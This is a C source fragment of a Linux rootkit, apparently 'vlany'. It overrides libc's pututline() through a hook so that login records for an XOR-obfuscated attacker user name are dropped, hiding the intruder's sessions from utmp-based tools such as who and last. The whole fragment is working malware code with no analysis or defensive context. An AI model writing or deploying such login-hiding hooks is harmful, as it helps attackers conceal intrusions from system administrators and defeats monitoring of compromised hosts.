struct utmp *pututline(const struct utmp *ut)
{
    #ifdef DEBUG
        printf("[vlany] pututline() called\n");
    #endif

    HOOK(old_pututline, CPUTUTLINE);

    struct utmp *tmp;
    tmp = old_pututline(ut);

    if(tmp && tmp->ut_user != NULL)
    {
        char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
        if(!strcmp(tmp->ut_user, vlany_user)) { CLEAN(vlany_user); return NULL; }
        CLEAN(vlany_user);
    }

    return old_pututline(ut);
}
